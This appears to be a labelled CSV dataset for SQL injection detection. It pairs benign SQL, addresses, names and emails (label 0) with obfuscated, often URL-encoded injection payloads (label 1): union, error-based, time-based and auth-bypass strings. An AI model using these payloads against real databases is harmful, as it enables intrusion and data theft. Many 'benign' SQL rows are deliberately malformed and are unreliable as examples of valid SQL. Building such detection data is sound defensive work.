Query,Label
"grupo fuensanta 197, 12?a",0
"calle goya 46, 10?g",0
-6122%22%20%20%29%20%20%20union%20all%20select%206578%2C6578--,1
s4dsudeste,0
SELECT * FROM sharp WHERE seed = 'within' LIMIT 3,0
confirmar,0
SELECT MIN ( happily )  AS exactly FROM blew,0
SELECT * FROM tongue WHERE cook = 'idea' LIMIT 3,0
"SELECT Orders.partyrID, Employees.your, Employees.roar FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.centralID ORDER BY Orders.deadID",0
"ametlla de mar, l'",0
1%20where%207757%20LIKE%207757%20%26%26%20updatexml%20%20%28%20%203393%2Cconcat%20%20%28%20%200x2e%2C0x7171706a71%2C%20%20%28%20%20select%20%20%20%28%20%20elt%20%20%28%20%203393%20LIKE%203393%2C1%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%2C0x717a767a71%20%20%29%20%20%2C1161%20%20%29%20%20--,1
"1%""/**//**//**/)/**//**//**//**/)/**//**//**//**/or/**/8514/**//**/ LIKE /**//**/benchmark/**//**/(/**//**/5000000,md5/**//**/(/**//**/0x544d5a4c/**//**//**/)/**//**//**//**/)/**//**//**/#",1
p05f74a.r,0
"SELECT MONTHNAME ( ""2017-06-15"" ) ;",0
DELETE FROM gave WHERE electric = 'between',0
SELECT * FROM aid WHERE    NOT wealth = 'long',0
"-9770'  )	 )			/*!aS*/ovhh/*!WHere*/7903	 = 	7903/*!OR*/5023	 = ctxsys.drithsx.sn	( 5023,	( 	chr	(	113  )||chr 	(	113)	||chr	( 112		) ||chr		(	 106)||chr 	(  113 )	||	(/*!sELECT*/(	/*!case*//*!WhEN*/		( 5023 = 	5023	) /*!thEn*/1/*!ELSE*/0/*!enD*/)  /*!FrOM*/dual	)||chr	 (	113  )	 ||chr (	122	)  ||chr(118) ||chr (122  )||chr (	 113)	)   )--",1
sEleCT *frOM users wheREid=1<@$	or	1	=  1	--1,1
"1""/**//*!WHERE*//**/4213/**//**/=/**//**/4213/**//*!ANd*//**/8407/**//**/=/**//**//**//**/(/**//**//*!SeLeCt*//**/count/**//**/(/**//**/*/**//**/)/**//**//**//*!froM*//**/generate_series/**//**/(/**//**/1,5000000/**//**//**/)/**//**//**//**/)/**//**//**/--",1
indiligencia,0
SELECT AVG ( act ) FROM service SELECT SUM ( program ),0
SELECT AVG ( Price ) FROM seeing,0
"1""  )  /*!as*/rbgl/*!whErE*/3822  =  3822 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  ( /*!BENchmark*/ (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",1
SELECT * FROM fall WHERE NOT attention = 'our'  AND NOT bad = 'plan',0
"SELECT coffee,band FROM tonight WHERE willing = 'sale' UNION SELECT merely, carbon FROM extra",0
DELETE FROM would WHERE officer = 'lying',0
select%20benchmark%20%20%28%20%205000000%2Cmd5%20%20%28%20%200x4c4d6142%20%20%20%29%20%20%20%20%29%20%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%22%25%22%20%20%3D%20%20%22,1
-5292%27%20%20%29%20%20%20union%20all%20select%201439%2C1439%2C1439%2C1439%23,1
harry,0
SELECT * FROM handsome WHERE stairs LIKE '%consonant%',0
"SELECT COUNT ( many ) , star FROM truth BY reach",0
1%22%20%20%29%20%20%20as%20kndn%20where%209314%20LIKE%209314,1
SELECT determine ( s ) FROM excitement INNER JOIN,0
organizar,0
SELECT AVG ( dropped ) FROM worth,0
SELECT TOP 3 * FROM gas WHERE recent = 'moon',0
"1""/**//**//**/)/**//**//**//**/)/**//**//**//**//**/)/**//**//**/||/**//**//**/(/**//**/select/**/2*/**//**/(/**//**/if/**//**//**/(/**//**//**//**/(/**//**//**/select/**/*/**/from/**//**//**/(/**//**/select/**/concat/**//**/(/**//**/0x7171706a71,/**//**/(/**//**/select/**//**//**/(/**//**/elt/**//**/(/**//**/8113/**/LIKE/**/8113,1/**//**//**/)/**//**//**//**/)/**//**//**//**//**/)/**//**/,0x717a767a71,0x78/**//**//**/)/**//**//**//**/)/**//**//**/s/**//**/)/**//**/,/**/8446744073709551610,/**/8446744073709551610/**//**//**/)/**//**//**//**/)/**//**//**//**//**/)/**//**//**/&&/**//**//**//**/(/**//**//**//**/(/**//**//**//**//**/(/**//**/""twpn""/**/like/**/""twpn",1
8912,0
SELECT AVG ( snow ) FROM shirt,0
"SELECT column_name ( s )  FROM citizen,action",0
"-9140""/**//**//**/)/**//**//**//**/)/**//**//**//**/union/**/all/**/select/**/1623,1623,1623,1623,1623,1623,1623,1623,1623#",1
SELECT AVG ( till ) FROM practical,0
"INSERT INTO highest ( opinion, heavy, paragraph, party, ball, chance )  VALUES  ( 'feed', 'inside'. process', 'rough', 'got', 'power', 'base' )",0
1%20%20%29%20%20/%2A%21or%2A/row%20%20%28%20%201045%2C7562%20%20%29%20%20%3E%20%20%28%20/%2A%21select%2A/count%20%20%28%20%20%2A%20%20%29%20%20%2Cconcat%20%20%28%20%200x7171706a71%2C%20%20%28%20/%2A%21select%2A/%20%20%28%20%20elt%20%20%28%20%201045%20LIKE%201045%2C1%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%2C0x717a767a71%2Cfloor%20%20%28%20%20rand%20%20%28%20%200%20%20%29%20%20%2A2%20%20%20%29%20%20%20%20%29%20%20%20x/%2A%21from%2A/%20%20%28%20/%2A%21select%2A/8488/%2A%21union%2A//%2A%21select%2A/5584/%2A%21union%2A//%2A%21select%2A/3051/%2A%21union%2A//%2A%21select%2A/1210%20%20%29%20%20a/%2A%21group%2A//%2A%21by%2A/x%20%20%29,1
kokoska1,0
"INSERT INTO page  ( flew, reach, printed )  VALUES  ( 'baby', 'bush', 'unhappy' )",0
1%22/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%21where%2A/1614/%2A%2A//%2A%2A/%3D/%2A%2A//%2A%2A/1614/%2A%21or%2A/extractvalue/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/1297%2Cconcat/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/0x5c%2C0x7171706a71%2C/%2A%2A//%2A%2A/%28/%2A%2A//%2A%21select%2A//%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/elt/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/1297/%2A%2A//%2A%2A/%3D/%2A%2A//%2A%2A/1297%2C1/%2A%2A//%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A//%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A/%2C0x717a767a71/%2A%2A//%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A/--,1
1%27%20or%20updatexml%20%20%28%20%201808%2Cconcat%20%20%28%20%200x2e%2C0x7171706a71%2C%20%20%28%20%20select%20%20%20%28%20%20elt%20%20%28%20%201808%20%20%3D%20%201808%2C1%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%2C0x717a767a71%20%20%29%20%20%2C8666%20%20%29%20%20%20and%20%27vvkl%27%20%20%3D%20%20%27vvkl,1
hinojal,0
"1'/**/in/**/boolean/**/mode/**//**/)/**//**//**//**/(/**//**/select/**//**//**/(/**//**/case/**/when/**//**//**/(/**//**/5451/**//**/=/**//**/5451/**//**/)/**//**//**/then/**/regexp_substring/**//**/(/**//**/repeat/**//**/(/**//**/right/**//**/(/**//**/char/**//**/(/**//**/5451/**//**/)/**//**/,0/**//**/)/**//**/,500000000/**//**/)/**//**/,null/**//**/)/**//**//**/else/**/char/**//**/(/**//**/108/**//**/)/**//**/||char/**//**/(/**//**/76/**//**/)/**//**/||char/**//**/(/**//**/112/**//**/)/**//**/||char/**//**/(/**//**/116/**//**/)/**//**//**/end/**//**/)/**//**//**/from/**/information_schema.system_users/**//**/)/**//**/#",1
"selEcT	count	(	*	)	 	/*!FROM*/sysibm.systables/*!aS*/t1,sysibm.systables	/*!aS*/ t2,sysibm.systables /*!aS*/t3/*!aNd*/	  ( 	(	""%""=	""",1
SELECT steep ( s )  FROM laid SELECT point FROM tribe,0
SELECT AVG ( let )  FROM continent  SELECT SUM ( magic ),0
madrigal puigb,0
SELECT COUNT ( worryID ) FROM dog,0
SELECT * FROM carbon  WHERE seeing = quickly,0
"1%""/**//**/)/**//**//**//*!and*//**/9660/**//**/=/**//**//**//**/(/**//**//*!select*//**/count/**//**/(/**//**/*/**//**/)/**//**//**//*!from*//**/all_users/**/t1,all_users/**/t2,all_users/**/t3,all_users/**/t4,all_users/**/t5/**//**/)/**//**/--",1
"SELECT   COALESCE ( NULL, 1, 2, 'W3Schools.com' ) ;",0
SELECT AVG ( printed ) FROM single,0
brooking-doolittle@encuentrodominios.lv,0
SELECT * FROM coming  WHERE dot NOT LIKE '[raise]%',0
22212,0
DELETE FROM zulu,0
SELECT * FROM office FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM feel,0
sELEcT/*!cAsE*//*!WhEN*/4656  =  3716/*!Then*/1/*!eLse*//*!nUlL*//*!eNd*/--,1
"-1475""/**//**/)/**//**//**/union/**/all/**/select/**/8611,8611,8611#",1
"INSERT INTO slowly  ( sight, tree, feature )  VALUES  ( 'farmer', 'means', 'but' )",0
"SELECT should, breeze, spent FROM there WHERE course  IS NULL",0
"1',		(	/*!select*/ (/*!case*//*!when*/(4209	= 5879 )/*!then*/1/*!else*/4209*(	/*!select*/4209/*!from*/information_schema.character_sets )	/*!end*/ )	)",1
SELECT continent ( s ) FROM ice INNER JOIN,0
15990,0
"SELECT * FROM held ORDER BY today, mistake",0
SELECT * FROM industry,0
SELECT spent ( s )  FROM chief SELECT long FROM sum,0
calle panaderas de san cecilio 168,0
SELECT * FROM hay FETCH FIRST 3 ROWS ONLY,0
alcolea,0
duby@mtos.mt,0
enseriarse,0
"1""/**/)	)		  or6979LIKElike( 'abcdefg',upper	 (hex (	randomblob ( 500000000/2   )	  )				)	) --",1
SELECT * FROM child WHERE today = 'depth' LIMIT 3,0
SELECT AVG ( funny ) FROM around,0
"SELECT soundID AS ID, situation AS common FROM watch",0
"1"" where 1115 LIKE 1115 || 8384 LIKE like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
SELECT * FROM examine 3,0
rorke,0
1/**//*!WHERE*//**/1519/**//**/=/**//**/1519,1
"1""/**/where/**/4450/**/LIKE/**/4450/**/or/**/6979/**/LIKE/**/like/**//**/(/**//**/'abcdefg',upper/**//**/(/**//**/hex/**//**/(/**//**/randomblob/**//**/(/**//**/500000000/2/**//**//**/)/**//**//**//**/)/**//**//**//**//**//**/)/**//**//**//**/)/**//**//**/--",1
SELECT * FROM torn WHERE addition LIKE '%hide%',0
23215,0
DELETE FROM step WHERE now = 'other',0
SELECT * FROM of WHERE garden = 'observe' FETCH FIRST 3 ROWS ONLY,0
de las muecas pedrol,0
andara francino,0
"carretera de vista-rica s/n,",0
9.84is22nte334c799,0
"iif/**//**/(/**//**/8213/**//**/=/**//**/4718,1,1/0/**//**/)",1
"calle san isidro labrador 188, 13?h",0
"pl. san marcos, 0, 11f",0
32027973j,0
SELECT * FROM sudden FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM skill ORDER BY product DESC,0
1/*!WheRe*/5161  =  5161/*!aNd*/3754  =    ( /*!selEcT*/upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  ( /*!selEcT*/  ( /*!CAse*//*!WhEn*/  (  3754  =  3754  )  /*!THeN*/1/*!elsE*/0/*!eNd*/ )  /*!froM*/dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )  /*!froM*/dual  )  --,1
pensosa,0
SELECT * FROM street ORDER BY suddenly,0
select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5--,1
SELECT TOP 3 * FROM wild WHERE laid = 'same' SELECT * FROM provide,0
"SELECT * FROM double ORDER BY steam ASC, breeze DESC",0
"SELECT * FROM frozen ORDER BY over, former",0
1%20or%20exp%20%20%28%20%20~%20%20%28%20%20seLECt%20%2A%20FRom%20%20%20%28%20%20seLECt%20concat%20%20%28%20%200x7171706a71%2C%20%20%28%20%20seLECt%20%20%20%28%20%20elt%20%20%28%20%206270%20%20%3D%20%206270%2C1%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%2C0x717a767a71%2C0x78%20%20%20%29%20%20%20%20%29%20%20%20x%20%20%20%29%20%20%20%20%29%20%20%20--%20nqdb,1
SELECT * FROM  ( SELECT hand FROM situation ),0
SELECT * FROM tin FETCH FIRST 50 PERCENT ROWS ONLY,0
select%20%2A%20from%20generate_series%20%20%28%20%207724%2C7724%2CCAsE%20WhEn%20%20%20%28%20%207724%20LiKE%208170%20%20%29%20%20%20Then%201%20eLsE%200%20eND%20%20%29%20%20%20lIMIT%201--,1
SELECT * FROM solar WHERE known BETWEEN 'declared' AND 'nothing',0
87,0
"SELECT Employees.warm, COUNT ( Orders.twoID )  AS diagramFROM    ( OrdersINNER JOIN shadow ON Orders.pondID  =  Employees.norID )",0
FROM  ( SELECT DISTINCT dug FROM over ),0
cella,0
"-4934""/*!union*//*!all*//*!select*/	5119,5119,5119,5119,5119--",1
"SELECT Employees.youth, COUNT ( Orders.doubtID )  AS wouldFROM    ( OrdersINNER JOIN longer ON Orders.everythingID  =  Employees.orID )",0
"1,  ( /*!select*/  ( /*!case*//*!when*/  (  6750  =  6750  )  /*!then*/1/*!else*/6750*  ( /*!select*/6750/*!from*/information_schema.character_sets  )  /*!end*/  )    )",1
SELECT * FROM football WHERE shaking = 'sport'  OR clothing = 'oil',0
"-3393""/**/ )	)		/*!union*/ /*!all*/	/*!select*/ 5954,5954,5954,5954,5954,5954,5954,5954,5954,5954--",1
e0u08os1,0
arcos,0
"SELECT list, mine+ ', ' + coming+ ' ' + closer+ ', ' + fence AS happy  FROM tales",0
maclaren,0
SELECT COUNT ( direction ) FROM tongue,0
"calle hostieros, 24",0
SELECT * FROM bent ORDER BY length DESC,0
"INSERT INTO truck ( laid, map, divide, unknown, trail, blood )  VALUES  ( 'seeing', 'activity'. zebra', 'stiff', 'remember', 'fierce', 'at' )",0
SELECT TOP 3 * FROM hall,0
calle nicolas funes 116,0
1/**//**/)/**//**//*!AS*/nxmd/*!WhEre*/8650/**//**/=/**//**/8650,1
SELECT TOP 50 PERCENT * FROM previous SELECT * FROM sale FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM judge,0
"1'WHerE 8277	=	8277||updatexml(1808,concat	 ( 0x2e,0x7171706a71, (	SeLEcT 	(	 elt		(1808 = 1808,1	 	)	 	) 	  ) ,0x717a767a71	) ,8666)	--",1
"antelo y mario, 192,",0
1'||  (  SELect 'zwcp' wHere 3333  =  3333,1
"1' )		)	||2633= 	dbms_pipe.receive_message(	chr(112		) 	||chr (	65 	)||chr (65	)  ||chr	( 103)	,5	)		&& (	 (	 'stqq' =	 'stqq",1
SELECT * FROM storm WHERE teach BETWEEN '1996-07-01' AND '1996-07-31',0
1is4r1o,0
"SELECT Orders.nearlyrID, Employees.suppose, Employees.balance FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.provideID ORDER BY Orders.tapeID",0
"1'  )  /*!||*/4411  =    ( /*!select*/count  (  *  )  /*!from*/sysusers/*!as*/sys1,sysusers/*!as*/sys2,sysusers/*!as*/sys3,sysusers/*!as*/sys4,sysusers/*!as*/sys5,sysusers/*!as*/sys6,sysusers/*!as*/sys7  )",1
SELECT ATAN ( 2.5 ) ;,0
"1%""	) ) AnD8635 LIKe (	selEcTcount  (	*	)	froMgenerate_series ( 1,5000000	) 		) --",1
SELECT AVG ( volume ) FROM take SELECT SUM ( sometime ),0
carmia,0
"1""	 )	) 		)		&&4967	= 8866	&&	 (	(  (	""jzyn"" like	""jzyn",1
escuder liveris,0
SELECT * FROM  ( SELECT care FROM yesterday ),0
SELECT * FROM promised WHERE shout BETWEEN black09/01/1996nearly AND jungle15/31/1996move,0
"1'||/**/(	select	'wcad'	from	dualwhere 4262 =4262 and elt (3114	 = 3114,sleep (	5)	 )#",1
SELECT * FROM couple WHERE paid = 'youth'  AND  ( level = 'melted' OR long = 'luck' ),0
SELECT TOP 3 * FROM unknown,0
waitfordelay'0:0:5',1
"SELECT laid,primitive,pass,education,above     (  (  select JOIN cross ON roll.indicate =  notice.region )   INNER JOIN typicalON Orders.pound =  aid.filmID )",0
"virgen del valle, 40",0
SELECT * FROM adjective WHERE Price NOT BETWEEN 10 AND 20,0
1%22%20and%20extractvalue%20%20%28%20%207982%2Cconcat%20%20%28%20%200x5c%2C0x7171706a71%2C%20%20%28%20%20select%20%20%20%28%20%20elt%20%20%28%20%207982%20%20%3D%20%207982%2C1%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%2C0x717a767a71%20%20%20%29%20%20%20%20%29%20%20%20%20and%20%22okpa%22%20%20%3D%20%20%22okpa,1
-2803%22%C2%A0%0C%29%C2%A0%0B%0Cunion%C2%A0all%C2%A0select%095337%2C5337%2C5337%2C5337%2C5337%2C5337%2C5337%23,1
SELECT Count ( * )  AS driver,0
c7o5ologa,0
SELECT * FROM brief WHERE lesson NOT BETWEEN 'chose' AND 'sent',0
1%22%0Cwhere%0B5062%0C%09%3D%C2%A0%0B5062,1
SELECT DISTINCT compass FROM bell,0
"SELECT second,term,jack,affect,field     (  (  cup JOIN shoe ON add.orange =  space.contain )   INNER JOIN tipON Orders.percent =  distance.changeID )",0
"SELECT battle,expect,none FROM stranger LEFT JOIN Orders ON substance.roarID =  time.special ORDER BY dead.mainly",0
"SELECT FIELD ( ""q"", ""s"", ""q"", ""l"" ) ;",0
1%22%0B%C2%A0%0B%29%09%0C%C2%A0%C2%A0%29%09%C2%A0%0B%C2%A0as%09jucs%C2%A0where%C2%A06836%0C%0B%3D%09%096836,1
SELECT * FROM speed WHERE NOT wagon = 'throw'  AND NOT distance = 'depth',0
5335,0
22618043g,0
9e1an906,0
FROM  ( SELECT DISTINCT stranger FROM managed ),0
SELECT * FROM left  WHERE please NOT LIKE '[customs]%',0
1%25%22%20%20%29%20%20%20uNIon%20aLL%20selEcT%20nulL%2CnulL%2CnulL%2CnulL%2CnulL%2CnulL%2CnulL%23,1
24710,0
"1'+  (  sELeCt cjcp Where 2590 LIKE 2590 uNion alL sELeCt NUll,NUll,NUll,NUll,NUll,NUll,NUll#",1
1%27%0B%0C%C2%A0%29%09%0B%0C%0C%29%0C%0B%09%0B%26%26%092853%0C%0B%3D%0C%C2%A0cast%0C%C2%A0%0B%28%0C%0B%09%0C%28%C2%A0%0B%09chr%0C%C2%A0%28%C2%A0%0B113%C2%A0%09%29%0C%0B%7C%7Cchr%09%0B%28%0C%0B113%0B%09%29%0C%0C%7C%7Cchr%0C%09%28%0B%C2%A0112%0B%0B%29%09%C2%A0%7C%7Cchr%0B%0B%28%09%C2%A0106%0C%C2%A0%29%0C%09%7C%7Cchr%0C%0C%28%0C%0B113%0C%0C%0C%29%C2%A0%C2%A0%C2%A0%0B%29%0C%0C%09%7C%7C%0C%0B%28%09%09select%09%0B%0C%28%C2%A0%0Bcase%09when%C2%A0%09%09%28%0C%092853%0B%09%3D%C2%A0%0C2853%09%C2%A0%29%C2%A0%C2%A0%C2%A0then%091%0Belse%C2%A00%C2%A0end%09%09%0B%29%C2%A0%C2%A0%0B%0C%29%0B%09%0B%3A%3Atext%7C%7C%0C%09%28%0B%C2%A0chr%C2%A0%09%28%09%09113%C2%A0%C2%A0%29%C2%A0%09%7C%7Cchr%C2%A0%0B%28%0B%0C122%09%C2%A0%29%0C%C2%A0%7C%7Cchr%0B%09%28%09%09118%C2%A0%C2%A0%29%0C%0B%7C%7Cchr%09%0C%28%09%0C122%09%C2%A0%29%0B%09%7C%7Cchr%0B%09%28%0C%0B113%C2%A0%C2%A0%0C%29%09%0C%09%09%29%0B%09%09%0Cas%09numeric%09%0B%29%C2%A0%0B%0C%26%26%C2%A0%0C%0B%0C%28%09%C2%A0%C2%A0%09%28%0B%0B%0B%27guxv%27%09%0C%3D%09%C2%A0%27guxv,1
SELECT active FROM bottle UNION ALL SELECT hit FROM twice ORDER BY it,0
SELECT review FROM told UNION SELECT sand FROM studying ORDER BY single,0
SELECT * FROM branch WHERE result = 'window' FETCH FIRST 3 ROWS ONLY,0
SELECT jet ( s )  FROM nervous UNION ALL,0
-7497'  )  /*!as*/kjzt/*!where*/3758  =  3758 || 4794  =  9499--,1
1%22%20%20%29%20%20%20procedure%20analyse%20%20%28%20%20extractvalue%20%20%28%20%209627%2Cconcat%20%20%28%20%200x5c%2C%20%20%28%20%20benchmark%20%20%28%20%205000000%2Cmd5%20%20%28%20%200x4b774c75%20%20%20%29%20%20%20%20%29%20%20%20%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%2C1%20%20%29%20%20%23,1
call/%2A%2A/regexp_substring/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/repeat/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/lEfT/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/crypt_key/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/chAR/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/65/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A/%7C%7CchAR/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/69/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A/%7C%7CchAR/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/83/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A/%2CnUll/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A/%2C0/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A/%2C500000000/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A/%2CnUll/%2A%2A//%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A/%2B%27,1
SELECT * FROM supply WHERE fellow = 'youth' FETCH FIRST 3 ROWS ONLY,0
"1%"" /*!aND*/	9660=		  (	/*!sElect*/	count	(	* 	) /*!FroM*/all_userst1,all_userst2,all_userst3,all_userst4,all_userst5 )		--",1
1'	)/*!where*/8707	 =	8707/*!and*/3210	 =	1477--,1
27113,0
47319,0
1%27%20%20%20%29%20%20%20%20%29%20%20%20%20or%20sleep%20%20%28%20%205%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%27taaj%27%20%20%3D%20%20%27taaj,1
-9331'/**/Or/**//**//**/(/**//**/4519/**//**/ LIKE /**//**/2912/**//**/)/**//**/*2912/**/aNd/**/'rddk'/**//**/ LIKE /**//**/'rddk,1
almonacid de la sierra,0
boes@cumbareback.kz,0
1)			as nwfz where	7365 =7365&&4386	 =	utl_inaddr.get_host_address (	chr  ( 113 )	 ||chr  (	113		)||chr 	(	112) ||chr ( 106	)		||chr (113) || ( select 	(case	when		(	4386=  4386)	then	1	else0end )		fromdual  ) 	||chr ( 113 ) ||chr (122 	)	||chr(118		)||chr (	122	 )	||chr ( 113		)		)	 --,1
"(/**/	select	 ( casewhen		( 	3531 LIKE 3531	)  then  ( selectcount (*	)	from	sysusersassys1,sysusersas	sys2,sysusersassys3,sysusersassys4,sysusersassys5,sysusers assys6,sysusers	as sys7) else	3531	end		) 	  )",1
476en9o9na5,0
SELECT * FROM stranger WHERE cloth IN  ( SELECT rule FROM money ),0
or/**/sleep (__TIME__)	#,1
SELECT flag FROM directly UNION ALL SELECT combination FROM swim ORDER BY triangle,0
SELECT bell ( s )  FROM only LEFT JOIN,0
ecija 51 12-h,0
1%22%20and%20%20%20%28%20%20select%202%2A%20%20%28%20%20if%20%20%20%28%20%20%20%20%28%20%20%20select%20%2A%20from%20%20%20%28%20%20select%20concat%20%20%28%20%200x7171706a71%2C%20%20%28%20%20select%20%20%20%28%20%20elt%20%20%28%20%203484%20LIKE%203484%2C1%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%2C0x717a767a71%2C0x78%20%20%20%29%20%20%20%20%29%20%20%20s%20%20%29%20%20%2C%208446744073709551610%2C%208446744073709551610%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20and%20%22svse%22%20LIKE%20%22svse,1
"c/ fancelli, 34 6b",0
rix.piljeckaja@waterflyesp.be,0
1%27/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A/as/%2A%2A/mpsf/%2A%2A/where/%2A%2A/3348/%2A%2A//%2A%2A/%3D/%2A%2A//%2A%2A/3348,1
1%27/%2A%2A/%26%26/%2A%2A/6969/%2A%2A//%2A%2A/%3D/%2A%2A//%2A%2A//%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/select/%2A%2A/6969/%2A%2A/from/%2A%2A/pg_sleep/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/5/%2A%2A//%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A//%2A%2A/%26%26/%2A%2A/%27zoin%27/%2A%2A//%2A%2A/%3D/%2A%2A//%2A%2A/%27zoin,1
admin'	 )	 	Or	'1' ='1,1
"SELECT STR_TO_DATE ( ""August,5,2017"", ""%M %e %Y"" ) ;",0
25186,0
c/ grabador david roberts 154 1-h,0
SELECT wood,0
"1""/**//**//**/)/**//**//**//**/)/**//**//**//*!and*/3824/*!LIKE*//*!benchmark*//**/(/**//**/5000000,md5/**//**/(/**//**/0x76555642/**//**//**/)/**//**//**//**/)/**//**//**//*!and*//**//**//**/(/**//**//**//**/(/**//**//**/""alkz""/*!LIKE*/""alkz",1
"1""/**//**//**/)/**//**//**//**/)/**//**//**//**//**/)/**//**//**/anD/**/2853/**/LiKE/**/caSt/**//**//**/(/**//**//**//**/(/**//**//**/chr/**//**/(/**//**/113/**//**/)/**//**/||chr/**//**/(/**//**/113/**//**/)/**//**/||chr/**//**/(/**//**/112/**//**/)/**//**/||chr/**//**/(/**//**/106/**//**/)/**//**/||chr/**//**/(/**//**/113/**//**//**/)/**//**//**//**/)/**//**//**/||/**//**/(/**//**/SElEct/**//**//**/(/**//**/caSe/**/wHEN/**//**//**/(/**//**/2853/**/LiKE/**/2853/**//**/)/**//**//**/tHEN/**/1/**/elSe/**/0/**/ENd/**//**//**/)/**//**//**//**/)/**//**//**/::TEXT||/**//**/(/**//**/chr/**//**/(/**//**/113/**//**/)/**//**/||chr/**//**/(/**//**/122/**//**/)/**//**/||chr/**//**/(/**//**/118/**//**/)/**//**/||chr/**//**/(/**//**/122/**//**/)/**//**/||chr/**//**/(/**//**/113/**//**//**/)/**//**//**//**/)/**//**//**//**/AS/**/numeric/**//**/)/**//**//**/anD/**//**//**//**/(/**//**//**//**/(/**//**//**//**//**/(/**//**/""dwcy""/**/LiKE/**/""dwcy",1
